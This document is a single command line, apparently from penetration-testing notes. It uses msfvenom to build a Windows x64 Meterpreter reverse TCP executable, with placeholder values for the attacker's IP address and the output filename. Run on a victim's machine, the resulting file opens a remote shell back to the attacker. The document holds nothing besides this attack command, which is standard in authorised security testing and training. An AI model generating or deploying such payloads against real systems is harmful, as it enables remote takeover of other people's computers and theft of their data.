msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -a x64 -o /root/Desktop/<filename>.exe
